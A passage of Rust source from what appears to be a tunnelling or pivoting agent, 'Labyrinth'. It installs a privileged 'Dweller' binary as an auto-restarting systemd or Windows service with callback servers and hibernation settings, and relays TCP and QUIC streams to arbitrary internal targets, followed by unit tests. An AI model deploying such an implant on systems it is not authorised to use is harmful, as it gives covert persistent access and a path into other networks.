            .map_err(LabyrinthError::Io)?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            tokio::fs::set_permissions(&install_path, std::fs::Permissions::from_mode(0o755))
                .await
                .map_err(LabyrinthError::Io)?;
        }

        let cert_path = config_dir.join("dweller-cert.pem");
        let key_path = config_dir.join("dweller-key.pem");
        tokio::fs::write(&cert_path, &request.cert_pem)
            .await
            .map_err(LabyrinthError::Io)?;
        tokio::fs::write(&key_path, &request.key_pem)
            .await
            .map_err(LabyrinthError::Io)?;
        let config_path = config_dir.join("dweller-config.json");
        let runtime_config = DwellerRuntimeConfig {
            callback_servers: request.callback_servers.clone(),
            hibernation: request.hibernation.clone(),
        };
        tokio::fs::write(&config_path, serde_json::to_string_pretty(&runtime_config)?)
            .await
            .map_err(LabyrinthError::Io)?;

        Self::install_dweller_service(&request, &install_path, &cert_path, &key_path, &config_path)
            .await?;
        Self::verify_dweller_listening(&request.listen_addr, request.listen_port).await?;

        Ok(DwellerInstallReceipt {
            dweller_id: request.dweller_id,
            dweller_name: request.dweller_name,
            hostname: hostname::get()
                .unwrap_or_else(|_| "unknown".into())
                .to_string_lossy()
                .to_string(),
            os: std::env::consts::OS.to_string(),
            arch: std::env::consts::ARCH.to_string(),
            listen_addr: request.listen_addr,
            listen_port: request.listen_port,
            fingerprint: SecurityManager::fingerprint_from_pem(&request.cert_pem)?,
            install_path: request.install_path,
            config_dir: request.config_dir,
            service_name: request.service_name,
            callback_servers: request.callback_servers,
            parent_path: request.parent_path,
            hibernation: request.hibernation,
        })
    }

    fn ensure_dweller_permissions() -> Result<()> {
        #[cfg(target_os = "linux")]
        {
            let output = std::process::Command::new("id")
                .arg("-u")
                .output()
                .map_err(LabyrinthError::Io)?;
            if String::from_utf8_lossy(&output.stdout).trim() != "0" {
                return Err(LabyrinthError::Message(
                    "Drop Dweller requires root privileges on Linux".to_string(),
                ));
            }
        }

        #[cfg(target_os = "windows")]
        {
            let status = std::process::Command::new("cmd")
                .args(["/C", "net session >nul 2>&1"])
                .status()
                .map_err(LabyrinthError::Io)?;
            if !status.success() {
                return Err(LabyrinthError::Message(
                    "Drop Dweller requires administrative privileges on Windows".to_string(),
                ));
            }
        }

        Ok(())
    }

    async fn install_dweller_service(
        request: &DwellerInstallRequest,
        install_path: &Path,
        cert_path: &Path,
        key_path: &Path,
        config_path: &Path,
    ) -> Result<()> {
        #[cfg(target_os = "linux")]
        {
            let unit_path = format!("/etc/systemd/system/{}.service", request.service_name);
            let unit = format!(
                "[Unit]\nDescription=Labyrinth Dweller {}\nAfter=network.target\n\n[Service]\nType=simple\nExecStart={} dweller --listen {}:{} --cert-file {} --key-file {} --id {} --name '{}' --auth-key '{}' --config-file {}\nRestart=always\nRestartSec=5\n\n[Install]\nWantedBy=multi-user.target\n",
                request.dweller_name,
                shell_escape(install_path),
                request.listen_addr,
                request.listen_port,
                shell_escape(cert_path),
                shell_escape(key_path),
                request.dweller_id,
                request.dweller_name.replace('"', ""),
                request.auth_key,
                shell_escape(config_path)
            );
            tokio::fs::write(&unit_path, unit)
                .await
                .map_err(LabyrinthError::Io)?;
            Self::run_local_command("systemctl", &["daemon-reload"])?;
            Self::run_local_command("systemctl", &["enable", "--now", &request.service_name])?;
        }

        #[cfg(target_os = "windows")]
        {
            let quoted_install = format!(
                "\"{}\" dweller --listen {}:{} --cert-file \"{}\" --key-file \"{}\" --id {} --name \"{}\" --auth-key \"{}\" --config-file \"{}\"",
                install_path.display(),
                request.listen_addr,
                request.listen_port,
                cert_path.display(),
                key_path.display(),
                request.dweller_id,
                request.dweller_name,
                request.auth_key,
                config_path.display(),
            );

            let _ = Self::run_local_command("sc", &["stop", &request.service_name]);
            let _ = Self::run_local_command("sc", &["delete", &request.service_name]);
            Self::run_local_command(
                "sc",
                &[
                    "create",
                    &request.service_name,
                    "binPath=",
                    &quoted_install,
                    "start=",
                    "auto",
                ],
            )?;
            Self::run_local_command("sc", &["start", &request.service_name])?;
        }

        Ok(())
    }

    async fn verify_dweller_listening(listen_addr: &str, listen_port: u16) -> Result<()> {
        let host = if listen_addr == "0.0.0.0" {
            "127.0.0.1"
        } else {
            listen_addr
        };
        for _ in 0..10 {
            if TcpStream::connect((host, listen_port)).await.is_ok() {
                return Ok(());
            }
            sleep(Duration::from_secs(1)).await;
        }

        Err(LabyrinthError::Message(format!(
            "Dweller listener did not become ready on {}:{}",
            host, listen_port
        )))
    }

    fn run_local_command(cmd: &str, args: &[&str]) -> Result<()> {
        let output = std::process::Command::new(cmd)
            .args(args)
            .output()
            .map_err(LabyrinthError::Io)?;
        if !output.status.success() {
            return Err(LabyrinthError::Message(format!(
                "Command failed: {} {:?} -> {}",
                cmd,
                args,
                String::from_utf8_lossy(&output.stderr)
            )));
        }
        Ok(())
    }

    async fn start_port_forward(local_port: u16, target_addr: &str) -> Result<()> {
        let listener = TcpListener::bind(format!("0.0.0.0:{}", local_port))
            .await
            .map_err(LabyrinthError::Io)?;

        info!(
            "{} Port forwarding listening on 0.0.0.0:{}",
            styling::SUCCESS_INDICATOR,
            local_port
        );

        loop {
            match listener.accept().await {
                Ok((mut inbound, client_addr)) => {
                    let target_addr = target_addr.to_string();
                    tokio::spawn(async move {
                        match TcpStream::connect(&target_addr).await {
                            Ok(mut outbound) => {
                                info!(
                                    "{} Forwarding connection from {} to {}",
                                    styling::SUCCESS_INDICATOR,
                                    client_addr,
                                    target_addr
                                );
                                if let Err(e) =
                                    tokio::io::copy_bidirectional(&mut inbound, &mut outbound).await
                                {
                                    error!(
                                        "{} Port forwarding error: {}",
                                        styling::ERROR_INDICATOR,
                                        e
                                    );
                                }
                            }
                            Err(e) => {
                                error!(
                                    "{} Failed to connect to target {}: {}",
                                    styling::ERROR_INDICATOR,
                                    target_addr,
                                    e
                                );
                            }
                        }
                    });
                }
                Err(e) => {
                    error!(
                        "{} Failed to accept connection: {}",
                        styling::ERROR_INDICATOR,
                        e
                    );
                    break;
                }
            }
        }

        Ok(())
    }

    // Simple in-memory map of active target writers for streaming connections
    fn stream_writers() -> &'static tokio::sync::RwLock<
        std::collections::HashMap<ConnectionId, Arc<tokio::sync::Mutex<OwnedWriteHalf>>>,
    > {
        static WRITERS: std::sync::OnceLock<
            tokio::sync::RwLock<
                std::collections::HashMap<ConnectionId, Arc<tokio::sync::Mutex<OwnedWriteHalf>>>,
            >,
        > = std::sync::OnceLock::new();
        WRITERS.get_or_init(|| tokio::sync::RwLock::new(std::collections::HashMap::new()))
    }

    async fn run_quic_stream_acceptor(connection: quinn::Connection) {
        loop {
            match connection.accept_bi().await {
                Ok((send, recv)) => {
                    tokio::spawn(async move {
                        if let Err(e) = Self::handle_quic_stream(send, recv).await {
                            error!("{} QUIC stream failed: {}", styling::ERROR_INDICATOR, e);
                        }
                    });
                }
                Err(e) => {
                    warn!(
                        "{} QUIC stream acceptor stopped: {}",
                        styling::WARNING_INDICATOR,
                        e
                    );
                    break;
                }
            }
        }
    }

    pub(crate) async fn handle_quic_stream(
        mut send: quinn::SendStream,
        recv: quinn::RecvStream,
    ) -> Result<()> {
        let mut reader = tokio::io::BufReader::new(recv);
        let mut setup_buf = Vec::new();
        reader.read_until(b'\n', &mut setup_buf).await?;
        let message: Message =
            serde_json::from_slice(&setup_buf[..setup_buf.len().saturating_sub(1)])?;
        let (connection_id, mapping) = match message {
            Message::Stream(StreamMessage::Setup {
                connection_id,
                mapping,
            }) => (connection_id, mapping),
            other => {
                return Err(LabyrinthError::Message(format!(
                    "Unexpected QUIC stream setup message: {:?}",
                    other
                )))
            }
        };

        let target_addr = format!("{}:{}", mapping.target_host, mapping.target_port);
        let mut target = match TcpStream::connect(&target_addr).await {
            Ok(stream) => {
                let ack = Message::Stream(StreamMessage::SetupAck {
                    connection_id,
                    success: true,
                    error_message: None,
                });
                let ack_line = serde_json::to_string(&ack)?;
                send.write_all(ack_line.as_bytes())
                    .await
                    .map_err(|e| LabyrinthError::Message(format!("QUIC write failed: {}", e)))?;
                send.write_all(b"\n")
                    .await
                    .map_err(|e| LabyrinthError::Message(format!("QUIC write failed: {}", e)))?;
                stream
            }
            Err(e) => {
                let ack = Message::Stream(StreamMessage::SetupAck {
                    connection_id,
                    success: false,
                    error_message: Some(format!(
                        "Failed to connect to target {}: {}",
                        target_addr, e
                    )),
                });
                let ack_line = serde_json::to_string(&ack)?;
                send.write_all(ack_line.as_bytes())
                    .await
                    .map_err(|e| LabyrinthError::Message(format!("QUIC write failed: {}", e)))?;
                send.write_all(b"\n")
                    .await
                    .map_err(|e| LabyrinthError::Message(format!("QUIC write failed: {}", e)))?;
                return Err(LabyrinthError::Io(e));
            }
        };

        let recv = reader.into_inner();
        let mut quic_stream = QuicBidiStream::new(send, recv);
        tokio::io::copy_bidirectional(&mut quic_stream, &mut target).await?;
        Ok(())
    }

    async fn handle_stream_message(stream_message: StreamMessage) -> Result<()> {
        match stream_message {
            StreamMessage::Setup {
                connection_id,
                mapping,
            } => {
                // Connect to target and start piping data back to server
                let target_addr = format!("{}:{}", mapping.target_host, mapping.target_port);
                let (tx, _rx) = crate::agent::reverse_port_forward::get_response_channel();
                let stream = match TcpStream::connect(&target_addr).await {
                    Ok(stream) => {
                        let ack = StreamMessage::SetupAck {
                            connection_id,
                            success: true,
                            error_message: None,
                        };
                        if let Err(e) = tx.send(Message::Stream(ack)).await {
                            error!(
                                "{} Failed to send setup acknowledgment for {}: {}",
                                styling::ERROR_INDICATOR,
                                target_addr,
                                e
                            );
                        }
                        stream
                    }
                    Err(e) => {
                        let ack = StreamMessage::SetupAck {
                            connection_id,
                            success: false,
                            error_message: Some(format!(
                                "Failed to connect to target {}: {}",
                                target_addr, e
                            )),
                        };
                        let _ = tx.send(Message::Stream(ack)).await;
                        return Err(LabyrinthError::Io(e));
                    }
                };

                let (mut read_half, write_half) = stream.into_split();

                // Store writer for future ClientToTarget writes
                {
                    let mut writers = Self::stream_writers().write().await;
                    writers.insert(connection_id, Arc::new(tokio::sync::Mutex::new(write_half)));
                }

                // Spawn a task to read from target and send to server
                let tx_clone = tx.clone();
                tokio::spawn(async move {
                    let mut buf = vec![0u8; 65536];
                    loop {
                        match read_half.read(&mut buf).await {
                            Ok(0) => {
                                // Target closed
                                let _ = tx_clone
                                    .send(Message::Stream(StreamMessage::Close {
                                        connection_id,
                                        reason: CloseReason::ClientDisconnected,
                                    }))
                                    .await;
                                break;
                            }
                            Ok(n) => {
                                let payload = Bytes::copy_from_slice(&buf[..n]);
                                let _ = tx_clone
                                    .send(Message::Stream(StreamMessage::Data {
                                        connection_id,
                                        payload,
                                        direction: DataDirection::TargetToClient,
                                    }))
                                    .await;
                            }
                            Err(e) => {
                                let _ = tx_clone
                                    .send(Message::Stream(StreamMessage::Close {
                                        connection_id,
                                        reason: CloseReason::ProtocolError(e.to_string()),
                                    }))
                                    .await;
                                break;
                            }
                        }
                    }
                });
            }
            StreamMessage::Data {
                connection_id,
                payload,
                direction,
            } => {
                if matches!(direction, DataDirection::ClientToTarget) {
                    // Write client->target data to the stored writer
                    let writer_arc = {
                        let writers = Self::stream_writers().read().await;
                        writers.get(&connection_id).cloned()
                    };
                    if let Some(writer_arc) = writer_arc {
                        let mut writer = writer_arc.lock().await;
                        writer
                            .write_all(&payload)
                            .await
                            .map_err(LabyrinthError::Io)?;
                    }
                }
            }
            StreamMessage::Close { connection_id, .. } => {
                // Remove writer to cleanup
                let mut writers = Self::stream_writers().write().await;
                writers.remove(&connection_id);
            }
            _ => {}
        }
        Ok(())
    }

    // Removed unused reverse port forward helpers; streaming handles data plane
}

pub async fn run_agent(
    server_addr: &str,
    server_cert_b64: Option<String>,
    accept_fingerprint: Option<String>,
    proxy: Option<String>,
    transport: TransportMode,
    retry: bool,
) -> Result<()> {
    AgentCore::run_agent(
        server_addr,
        server_cert_b64,
        accept_fingerprint,
        proxy,
        transport,
        retry,
    )
    .await
}

pub async fn run_dweller(config: DwellerRunConfig) -> Result<()> {
    AgentCore::run_dweller(config).await
}

#[cfg(target_os = "linux")]
fn shell_escape(path: &Path) -> String {
    path.display().to_string().replace(' ', "\\ ")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::streaming::models::{ConnectionId, PortMapping, StreamMessage};
    use std::io::ErrorKind;
    use std::sync::OnceLock;
    use tokio::net::TcpListener;
    use tokio::sync::Mutex as TokioMutex;
    use tokio::time::{timeout, Duration};

    fn stream_test_lock() -> &'static TokioMutex<()> {
        static LOCK: OnceLock<TokioMutex<()>> = OnceLock::new();
        LOCK.get_or_init(|| TokioMutex::new(()))
    }

    async fn next_response_message(timeout_ms: u64) -> Option<Message> {
        let (_, receiver) = crate::agent::reverse_port_forward::get_response_channel();
        let mut guard = receiver.lock().await;
        timeout(Duration::from_millis(timeout_ms), guard.recv())
            .await
            .ok()
            .flatten()
    }

    async fn drain_responses() {
        while next_response_message(10).await.is_some() {}
    }

    async fn wait_for_setup_ack(connection_id: ConnectionId, timeout_ms: u64) -> Option<Message> {
        let deadline = Duration::from_millis(timeout_ms);
        let started = tokio::time::Instant::now();

        loop {
            let elapsed = started.elapsed();
            if elapsed >= deadline {
                return None;
            }

            let remaining = deadline - elapsed;
            let step_timeout_ms = remaining.as_millis().min(50) as u64;
            let msg = next_response_message(step_timeout_ms).await;
            match msg {
                Some(Message::Stream(StreamMessage::SetupAck {
                    connection_id: ack_id,
                    success,
                    error_message,
                })) if ack_id == connection_id => {
                    return Some(Message::Stream(StreamMessage::SetupAck {
                        connection_id: ack_id,
                        success,
                        error_message,
                    }));
                }
                Some(_) => continue,
                None => return None,
            }
        }
    }

    #[tokio::test]
    async fn setup_stream_sends_success_ack() {
        let _guard = stream_test_lock().lock().await;
        drain_responses().await;

        let listener = match TcpListener::bind("127.0.0.1:0").await {
            Ok(listener) => listener,
            Err(e) => {
                if e.kind() == ErrorKind::PermissionDenied {
                    eprintln!("Skipping agent stream setup test (socket permissions): {e}");
                    return;
                }
                panic!("Unexpected socket error: {e}");
            }
        };
        let port = listener.local_addr().unwrap().port();
        tokio::spawn(async move {
            let _ = listener.accept().await;
        });

        let mapping = PortMapping {
            local_port: 0,
            target_host: "127.0.0.1".to_string(),
            target_port: port,
        };
        let connection_id = ConnectionId::new_v4();

        AgentCore::handle_stream_message(StreamMessage::Setup {
            connection_id,
            mapping,
        })
        .await
        .unwrap();

        let msg = wait_for_setup_ack(connection_id, 500)
            .await
            .expect("expected ack");
        match msg {
            Message::Stream(StreamMessage::SetupAck { success, .. }) => assert!(success),
            other => panic!("unexpected message {other:?}"),
        }
        drain_responses().await;
    }

    #[tokio::test]
    async fn setup_stream_sends_failure_ack() {
        let _guard = stream_test_lock().lock().await;
        drain_responses().await;

        let mapping = PortMapping {
            local_port: 0,
            target_host: "127.0.0.1".to_string(),
            target_port: 9, // reserved port, likely closed
        };
        let connection_id = ConnectionId::new_v4();

        let result = AgentCore::handle_stream_message(StreamMessage::Setup {
            connection_id,
            mapping,
        })
        .await;
        assert!(result.is_err());

        let msg = wait_for_setup_ack(connection_id, 500)
            .await
            .expect("expected ack");
        match msg {
            Message::Stream(StreamMessage::SetupAck { success, .. }) => assert!(!success),
            other => panic!("unexpected message {other:?}"),
        }
        drain_responses().await;
    }
}
